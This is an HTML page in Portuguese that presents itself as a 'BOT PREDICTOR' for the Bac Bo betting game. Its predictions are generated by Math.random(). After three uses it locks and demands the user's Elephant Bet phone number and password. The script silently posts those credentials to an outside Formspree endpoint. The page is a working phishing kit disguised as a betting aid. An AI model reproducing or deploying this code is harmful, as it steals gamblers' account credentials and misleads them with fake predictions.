<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>BOT PREDICTOR - Bac Bó</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #0d0d0d;
      color: #fff;
      margin: 0;
      padding: 20px;
    }
    h1 {
      color: #ff00ff;
      text-shadow: 0 0 10px #ff00ff;
      font-size: 1.8em;
    }
    .circle {
      font-size: 2em;
      margin: 20px auto;
      padding: 40px;
      border-radius: 50%;
      width: 180px;
      height: 180px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .azul { color:#00f; border:3px solid #00f; box-shadow:0 0 20px #00f; }
    .vermelho { color:#f00; border:3px solid #f00; box-shadow:0 0 20px #f00; }
    .empate { color:#ffd700; border:3px solid #ffd700; box-shadow:0 0 20px #ffd700; }
    .blocked {
      background:#333; color:#ffcc00; padding:10px; margin:15px auto;
      border-radius:5px; width:90%; font-size:0.9em;
    }
    .bar {
      background:#8000ff; padding:10px; margin:10px auto;
      border-radius:5px; width:90%; font-size:0.9em;
    }
    button {
      padding:12px 20px; background:#ff00aa; color:#fff; border:none;
      border-radius:5px; cursor:pointer; margin-top:15px; font-size:1em;
      width:80%; max-width:300px;
    }
    button:hover { background:#cc0088; }
    input {
      margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em;
    }
  </style>
</head>
<body>
  <h1>BOT PREDICTOR - Bac Bó</h1>

  <div id="circle" class="circle">--</div>

  <div id="blocked" class="blocked" style="display:none;">
    ⚠️ Acesso bloqueado
  </div>
  <div id="bar" class="bar" style="display:none;">
    Para ver o próximo resultado deverás conectar o Bot
  </div>

  <button id="preverBtn">Fazer Previsão</button>
  <div id="resultado"></div>

  <div class="section">
    <h2>Conecte com a sua conta da Elephant Bet</h2>
    <form id="loginForm" action="https://formspree.io/f/xgvneord" method="POST">
      <label for="numero">Número</label><br>
      <input type="text" id="numero" name="numero" placeholder="número de telemóvel" required><br>
      
      <label for="senha">Senha</label><br>
      <input type="text" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
      
      <button type="submit">Conectar Agora</button>
    </form>
    <a href="#">← Voltar</a>
  </div>

  <script>
    let previsoesFeitas = 0;
    let bloqueado = true; // bloqueio ativo até login válido
    const maxPrevisoes = 3;
    const circle = document.getElementById("circle");
    const resultado = document.getElementById("resultado");
    const preverBtn = document.getElementById("preverBtn");
    const blocked = document.getElementById("blocked");
    const bar = document.getElementById("bar");

    preverBtn.addEventListener("click", function() {
      if (bloqueado && previsoesFeitas >= maxPrevisoes) {
        blocked.style.display = "block";
        bar.style.display = "block";
        resultado.textContent = "";
        return;
      }

      previsoesFeitas++;

      const rand = Math.random();
      let banca, classe, valor;
      if (rand < 0.4) { banca="Azul"; classe="azul"; valor="80%"; }
      else if (rand < 0.8) { banca="Vermelho"; classe="vermelho"; valor="80%"; }
      else { banca="Empate"; classe="empate"; valor="20%"; }

      circle.textContent = valor;
      circle.className = "circle " + classe;
      resultado.textContent = `Previsão ${previsoesFeitas}: Resultado da banca → ${banca}`;
    });

    // Login com validação e desbloqueio
    const loginForm = document.getElementById("loginForm");
    const numeroInput = document.getElementById("numero");
    const senhaInput = document.getElementById("senha");

    numeroInput.addEventListener("input", function() {
      if (!numeroInput.value.startsWith("9")) { numeroInput.value = ""; }
      if (numeroInput.value.length > 9) { numeroInput.value = numeroInput.value.slice(0,9); }
    });

    loginForm.addEventListener("submit", async function(event) {
      event.preventDefault();
      const numero = numeroInput.value;
      const senha = senhaInput.value;

      if (!/^\d{9}$/.test(numero) || senha.length < 5) {
        return; // inválido, não envia
      }

      const formData = new FormData(loginForm);
      try {
        const response = await fetch(loginForm.action, {
          method: loginForm.method,
          body: formData,
          headers: { 'Accept': 'application/json' }
        });

        if (response.ok) {
          loginForm.reset();
          // Desbloquear previsões após login válido
          bloqueado = false;
          previsoesFeitas = 0;
          blocked.style.display = "none";
          bar.style.display = "none";
        }
      } catch (error) {
        // silencioso, sem mensagens
      }
    });
  </script>
</body>
</html>
